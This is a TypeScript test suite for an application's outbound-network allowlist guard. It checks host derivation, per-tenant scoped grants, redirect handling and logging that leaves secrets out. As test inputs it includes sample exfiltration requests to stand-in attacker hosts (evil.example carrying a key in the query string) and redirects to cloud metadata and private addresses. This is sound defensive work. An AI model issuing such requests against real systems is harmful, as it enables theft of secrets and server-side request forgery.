/**
 * The egress allowlist (#39).
 *
 * Two things are worth testing here and they are not the same thing. One is the
 * decision — which hosts a given configuration allows — and that is a pure function,
 * so it is tested directly. The other is that the wrapper actually stands between a
 * caller and the network, which needs a fake `fetch` underneath and an assertion that
 * it was never reached.
 *
 * A fresh module graph per case, because `config` validates and freezes at import and
 * the guard keeps module-level `installed` state. The same arrangement `jobs-ai.test.ts`
 * uses for the AI switch.
 */
import { afterEach, describe, expect, it, vi } from 'vitest'
import { applyMigrations } from '../../src/db/apply-migrations.ts'
import { createTestDb, type Db } from '../../src/db/index.ts'
import { tenantIntegrations } from '../../src/db/schema.ts'
import { getSoleTenantId } from '../../src/db/tenant.ts'

type Egress = typeof import('../../src/egress.ts')

const realFetch = globalThis.fetch

async function freshEgress(env: Record<string, string | undefined> = {}): Promise<Egress> {
  vi.resetModules()
  for (const [key, value] of Object.entries(env)) vi.stubEnv(key, value)
  return await import('../../src/egress.ts')
}

/** A migrated in-memory database with a tenant, for the dynamic-allowlist tests. */
function freshDb(): Db {
  const { db } = createTestDb()
  applyMigrations(db as never)
  return db
}

function insertIntegrations(
  db: Db,
  urls: {
    actualServerUrl: string
    ghostfolioUrl: string
    aiProvider?: 'gemini-aistudio' | 'openai' | 'xai' | 'openai-compatible' | 'anthropic'
  },
): void {
  db.insert(tenantIntegrations)
    .values({
      tenantId: getSoleTenantId(db),
      actualServerUrl: urls.actualServerUrl,
      actualPasswordEnc: 'unused-in-this-test',
      actualSyncId: 'sync-id',
      ghostfolioUrl: urls.ghostfolioUrl,
      ghostfolioSecurityTokenEnc: 'unused-in-this-test',
      aiProvider: urls.aiProvider ?? 'gemini-aistudio',
    })
    .run()
}

afterEach(() => {
  globalThis.fetch = realFetch
  vi.unstubAllEnvs()
  vi.resetModules()
})

describe('the allowlist', () => {
  it('is built from the same URLs the adapters read', async () => {
    const { allowedHosts } = await freshEgress()
    const hosts = allowedHosts()
    // The test environment points at these two; no second place to keep in step.
    expect(hosts.has('actual.test')).toBe(true)
    expect(hosts.has('ghostfolio.test')).toBe(true)
  })

  it('follows Actual to a new hostname without a second edit', async () => {
    const { allowedHosts } = await freshEgress({ ACTUAL_SERVER_URL: 'https://budget.example.org' })
    const hosts = allowedHosts()
    expect(hosts.has('budget.example.org')).toBe(true)
    expect(hosts.has('actual.test')).toBe(false)
  })

  it('allows one Google host for AI Studio', async () => {
    const { allowedHosts } = await freshEgress({ GEMINI_PROVIDER: 'aistudio' })
    expect(allowedHosts().has('generativelanguage.googleapis.com')).toBe(true)
    expect(allowedHosts().has('europe-west1-aiplatform.googleapis.com')).toBe(false)
  })

  it('derives the regional Vertex host from the configured location', async () => {
    const { allowedHosts } = await freshEgress({
      GEMINI_PROVIDER: 'vertex',
      GEMINI_API_KEY: undefined,
      GOOGLE_CLOUD_PROJECT: 'a-project',
      GOOGLE_CLOUD_LOCATION: 'europe-west4',
    })
    const hosts = allowedHosts()
    expect(hosts.has('europe-west4-aiplatform.googleapis.com')).toBe(true)
    expect(hosts.has('generativelanguage.googleapis.com')).toBe(false)
  })

  it('includes the OIDC issuer, which is a URL and not a hostname', async () => {
    const { allowedHosts } = await freshEgress({
      AUTH_OIDC_ISSUER: 'https://auth.example.org/application/o/balancr/',
      AUTH_OIDC_CLIENT_ID: 'balancr',
      AUTH_OIDC_CLIENT_SECRET: 'shh',
    })
    expect(allowedHosts().has('auth.example.org')).toBe(true)
  })

  it('takes the extra hosts as hostnames, case-folded', async () => {
    const { allowedHosts } = await freshEgress({ EGRESS_EXTRA_HOSTS: 'Proxy.Internal, other.test' })
    const hosts = allowedHosts()
    expect(hosts.has('proxy.internal')).toBe(true)
    expect(hosts.has('other.test')).toBe(true)
  })

  it('with no db argument, ignores anything a tenant has configured', async () => {
    const { allowedHosts } = await freshEgress()
    const hosts = allowedHosts()
    expect(hosts.has('actual.test')).toBe(true)
    expect(hosts.has('tenant-actual.example')).toBe(false)
  })

  it('does not union in a tenant-configured host — that is scoped per call instead (#535)', async () => {
    const { allowedHosts } = await freshEgress()
    const db = freshDb()
    insertIntegrations(db, {
      actualServerUrl: 'https://tenant-actual.example',
      ghostfolioUrl: 'https://tenant-ghostfolio.example',
    })

    const hosts = allowedHosts(db)
    expect(hosts.has('tenant-actual.example')).toBe(false)
    expect(hosts.has('tenant-ghostfolio.example')).toBe(false)
    // The static, `.env`-derived hosts are still there.
    expect(hosts.has('actual.test')).toBe(true)
  })

  it('a newly tenant-configured host is reachable via a scoped call, no restart needed', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, withScopedHost } = await freshEgress()
    const db = freshDb()
    installEgressGuard('enforce', db)

    insertIntegrations(db, {
      actualServerUrl: 'https://tenant-actual.example',
      ghostfolioUrl: 'https://tenant-ghostfolio.example',
    })

    const res = await withScopedHost('https://tenant-actual.example', () =>
      fetch('https://tenant-actual.example/health'),
    )
    expect(await res.text()).toBe('ok')
  })

  it('allows fixed official AI hosts for the tenant-selected certified presets', async () => {
    const { allowedHosts } = await freshEgress()
    const openaiDb = freshDb()
    insertIntegrations(openaiDb, {
      actualServerUrl: 'https://actual.example',
      ghostfolioUrl: 'https://ghostfolio.example',
      aiProvider: 'openai',
    })
    expect(allowedHosts(openaiDb).has('api.openai.com')).toBe(true)

    const xaiDb = freshDb()
    insertIntegrations(xaiDb, {
      actualServerUrl: 'https://actual.example',
      ghostfolioUrl: 'https://ghostfolio.example',
      aiProvider: 'xai',
    })
    expect(allowedHosts(xaiDb).has('api.x.ai')).toBe(true)

    const anthropicDb = freshDb()
    insertIntegrations(anthropicDb, {
      actualServerUrl: 'https://actual.example',
      ghostfolioUrl: 'https://ghostfolio.example',
      aiProvider: 'anthropic',
    })
    expect(allowedHosts(anthropicDb).has('api.anthropic.com')).toBe(true)
  })

  it('does not let a custom tenant base URL widen egress', async () => {
    const { allowedHosts } = await freshEgress()
    const db = freshDb()
    insertIntegrations(db, {
      actualServerUrl: 'https://actual.example',
      ghostfolioUrl: 'https://ghostfolio.example',
      aiProvider: 'openai-compatible',
    })
    db.update(tenantIntegrations).set({ aiBaseUrl: 'https://tenant-picked.example/v1' }).run()
    expect(allowedHosts(db).has('tenant-picked.example')).toBe(false)
  })
})

describe('withScopedHost (#369, #535)', () => {
  it('permits a host only for the duration of a scoped call, not globally', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, withScopedHost, EgressDeniedError } = await freshEgress()
    installEgressGuard()

    await expect(fetch('https://tenant-actual.example/health')).rejects.toThrow(EgressDeniedError)

    const result = await withScopedHost('https://tenant-actual.example', () =>
      fetch('https://tenant-actual.example/health').then((r) => r.text()),
    )
    expect(result).toBe('ok')

    await expect(fetch('https://tenant-actual.example/health')).rejects.toThrow(EgressDeniedError)
  })

  it('tolerates two overlapping calls to the same host without an early revoke', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, withScopedHost } = await freshEgress()
    installEgressGuard()

    const outer = withScopedHost('https://tenant-actual.example', async () => {
      const inner = await withScopedHost('https://tenant-actual.example', () =>
        fetch('https://tenant-actual.example/inner').then((r) => r.text()),
      )
      // The nested call returning must not end the outer call's own grant — the
      // outer async context is still in scope for the rest of this function.
      const outer = await fetch('https://tenant-actual.example/outer').then((r) => r.text())
      return { inner, outer }
    })
    await expect(outer).resolves.toEqual({ inner: 'ok', outer: 'ok' })
  })

  it('does not leak the grant to an unrelated concurrent call (#548)', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, withScopedHost, EgressDeniedError } = await freshEgress()
    installEgressGuard()

    // Attached *before* the scoped call opens, so its continuation's async context is
    // fixed to "outside any scope" — settling it later, from inside the scope, must
    // not retroactively hand it the grant.
    let releaseUnrelated: () => void = () => {}
    const unrelatedGate = new Promise<void>((resolve) => {
      releaseUnrelated = resolve
    })
    const unrelatedDenied = unrelatedGate.then(() => fetch('https://tenant-actual.example/unrelated'))

    const scoped = withScopedHost('https://tenant-actual.example', async () => {
      releaseUnrelated()
      await unrelatedDenied.catch(() => {})
      return fetch('https://tenant-actual.example/scoped').then((r) => r.text())
    })

    await expect(unrelatedDenied).rejects.toThrow(EgressDeniedError)
    await expect(scoped).resolves.toBe('ok')
  })
})

describe('the decision', () => {
  it('ignores the port, the scheme and the path', async () => {
    const { isAllowed } = await freshEgress()
    const allowed = new Set(['ghostfolio.test'])
    expect(isAllowed('http://ghostfolio.test:3333/api/v1/health', allowed)).toBe(true)
    expect(isAllowed('https://ghostfolio.test/api/v1/portfolio/details', allowed)).toBe(true)
  })

  it('does not let a host imply its subdomains, in either direction', async () => {
    const { isAllowed } = await freshEgress()
    const allowed = new Set(['ghostfolio.test'])
    expect(isAllowed('https://evil.ghostfolio.test/', allowed)).toBe(false)
    // The suffix trick a naive `endsWith` check falls for.
    expect(isAllowed('https://ghostfolio.test.evil.example/', allowed)).toBe(false)
  })

  it('always allows loopback, because the health check is not egress', async () => {
    const { isAllowed } = await freshEgress()
    const none: ReadonlySet<string> = new Set()
    expect(isAllowed('http://127.0.0.1:3000/healthz', none)).toBe(true)
    expect(isAllowed('http://localhost:3000/healthz', none)).toBe(true)
    expect(isAllowed('http://[::1]:3000/healthz', none)).toBe(true)
  })

  it('denies what it cannot parse rather than passing it through', async () => {
    const { isAllowed } = await freshEgress()
    expect(isAllowed('not-a-url', new Set(['actual.test']))).toBe(false)
  })
})

describe('enforce', () => {
  it('lets a configured host through, untouched', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    const res = await fetch('http://ghostfolio.test:3333/api/v1/health')
    expect(await res.text()).toBe('ok')
    expect(inner).toHaveBeenCalledOnce()
  })

  it('refuses an unconfigured host without reaching the network', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, EgressDeniedError } = await freshEgress()
    installEgressGuard()

    await expect(fetch('https://collector.evil.example/report')).rejects.toThrow(EgressDeniedError)
    expect(inner).not.toHaveBeenCalled()
  })

  /**
   * The reason the denial logs a host and not a URL: on an exfiltration attempt the
   * query string *is* the data. An error message that quoted it would copy the secret
   * into every log aggregator downstream.
   */
  it('names the host and never the path or query it was asked for', async () => {
    globalThis.fetch = (async () => new Response('ok')) as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    const secret = 'gemini-key-abcdef123456'
    const error = await fetch(`https://evil.example/collect?k=${secret}`).catch((e: unknown) => e)
    expect(error).toBeInstanceOf(Error)
    const message = (error as Error).message
    expect(message).toContain('evil.example')
    expect(message).not.toContain(secret)
    expect(message).not.toContain('/collect')
  })

  it('covers a Request object as well as a string and a URL', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    await expect(fetch(new Request('https://evil.example/'))).rejects.toThrow(/not allowed/)
    await expect(fetch(new URL('https://evil.example/'))).rejects.toThrow(/not allowed/)
    expect(inner).not.toHaveBeenCalled()
  })
})

describe('redirects (#412)', () => {
  const urlOf = (input: Parameters<typeof fetch>[0]): string =>
    typeof input === 'string' ? input : input instanceof URL ? input.href : input.url

  it.each([
    'http://127.0.0.1:3000/private',
    'http://[::1]:3000/private',
    'http://169.254.169.254/latest/meta-data',
    'http://10.0.0.1/admin',
    'http://192.168.1.1/admin',
    'http://metadata.google.internal/computeMetadata/v1/',
    'https://collector.evil.example/report',
  ])('blocks an allowed host redirecting to %s', async (location) => {
    const inner = vi.fn(async () =>
      new Response(null, { status: 302, headers: { location } }),
    )
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, EgressDeniedError } = await freshEgress()
    installEgressGuard()

    await expect(fetch('https://actual.test/start')).rejects.toThrow(EgressDeniedError)
    // The redirect target was validated before a second socket could be opened.
    expect(inner).toHaveBeenCalledOnce()
  })

  it('follows a relative and cross-host chain when every hop is allowed', async () => {
    const inner = vi.fn(async (input: Parameters<typeof fetch>[0]) => {
      const url = urlOf(input)
      if (url === 'https://actual.test/start') {
        return new Response(null, { status: 302, headers: { location: '/middle' } })
      }
      if (url === 'https://actual.test/middle') {
        return new Response(null, {
          status: 307,
          headers: { location: 'https://ghostfolio.test/finish' },
        })
      }
      return new Response('ok')
    })
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    const response = await fetch('https://actual.test/start')
    expect(await response.text()).toBe('ok')
    expect(inner.mock.calls.map(([input]) => urlOf(input))).toEqual([
      'https://actual.test/start',
      'https://actual.test/middle',
      'https://ghostfolio.test/finish',
    ])
  })

  it('preserves a 307 body, then applies 303 GET and cross-origin credential rules', async () => {
    const seen: Array<{ url: string; method: string; body: string; authorization: string | null }> = []
    const inner = vi.fn(async (input: Parameters<typeof fetch>[0]) => {
      const request = input instanceof Request ? input : new Request(input)
      seen.push({
        url: request.url,
        method: request.method,
        body: await request.text(),
        authorization: request.headers.get('authorization'),
      })
      if (seen.length === 1) {
        return new Response(null, { status: 307, headers: { location: '/preserved' } })
      }
      if (seen.length === 2) {
        return new Response(null, {
          status: 303,
          headers: { location: 'https://ghostfolio.test/finished' },
        })
      }
      return new Response('ok')
    })
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    await fetch('https://actual.test/start', {
      method: 'POST',
      headers: { authorization: 'Bearer secret', 'content-type': 'text/plain' },
      body: 'payload',
    })

    expect(seen).toEqual([
      {
        url: 'https://actual.test/start',
        method: 'POST',
        body: 'payload',
        authorization: 'Bearer secret',
      },
      {
        url: 'https://actual.test/preserved',
        method: 'POST',
        body: 'payload',
        authorization: 'Bearer secret',
      },
      {
        url: 'https://ghostfolio.test/finished',
        method: 'GET',
        body: '',
        authorization: null,
      },
    ])
  })

  it.each([301, 302])('turns a POST into a bodyless GET after a %i', async (status) => {
    const seen: Array<{ method: string; body: string; contentType: string | null }> = []
    const inner = vi.fn(async (input: Parameters<typeof fetch>[0]) => {
      const request = input instanceof Request ? input : new Request(input)
      seen.push({
        method: request.method,
        body: await request.text(),
        contentType: request.headers.get('content-type'),
      })
      return seen.length === 1
        ? new Response(null, { status, headers: { location: '/finished' } })
        : new Response('ok')
    })
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    await fetch('https://actual.test/start', {
      method: 'POST',
      headers: { 'content-type': 'text/plain' },
      body: 'payload',
    })

    expect(seen).toEqual([
      { method: 'POST', body: 'payload', contentType: 'text/plain' },
      { method: 'GET', body: '', contentType: null },
    ])
  })

  it('fails a redirect loop before repeating a request', async () => {
    const inner = vi.fn(async (input: Parameters<typeof fetch>[0]) => {
      const location = urlOf(input).endsWith('/a') ? '/b' : '/a'
      return new Response(null, { status: 302, headers: { location } })
    })
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, EgressRedirectError } = await freshEgress()
    installEgressGuard()

    await expect(fetch('https://actual.test/a')).rejects.toThrow(EgressRedirectError)
    expect(inner).toHaveBeenCalledTimes(2)
  })

  it('fails deterministically after five redirect hops', async () => {
    const inner = vi.fn(async (input: Parameters<typeof fetch>[0]) => {
      const current = Number(new URL(urlOf(input)).pathname.slice(1))
      return new Response(null, { status: 302, headers: { location: `/${current + 1}` } })
    })
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, EgressRedirectError, MAX_EGRESS_REDIRECTS } = await freshEgress()
    installEgressGuard()

    const error = await fetch('https://actual.test/0').catch((caught: unknown) => caught)
    expect(error).toBeInstanceOf(EgressRedirectError)
    expect((error as Error).message).toContain('5-hop limit')
    expect(inner).toHaveBeenCalledTimes(MAX_EGRESS_REDIRECTS + 1)
  })

  it('keeps the caller\'s manual redirect mode manual', async () => {
    const inner = vi.fn(async () =>
      new Response(null, { status: 302, headers: { location: 'https://collector.evil.example/' } }),
    )
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    const response = await fetch('https://actual.test/start', { redirect: 'manual' })
    expect(response.status).toBe(302)
    expect(inner).toHaveBeenCalledOnce()
  })
})

describe('the other two modes', () => {
  it('warn allows the call, so a new dependency can be seen before it is judged', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress({ EGRESS_MODE: 'warn' })
    installEgressGuard()

    const res = await fetch('https://collector.evil.example/report')
    expect(await res.text()).toBe('ok')
    expect(inner).toHaveBeenCalledOnce()
  })

  it('off does not wrap fetch at all', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress({ EGRESS_MODE: 'off' })
    installEgressGuard()

    expect(globalThis.fetch).toBe(inner)
  })

  it('installs once, however often it is called', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()
    const wrapped = globalThis.fetch
    installEgressGuard()
    expect(globalThis.fetch).toBe(wrapped)
  })
})
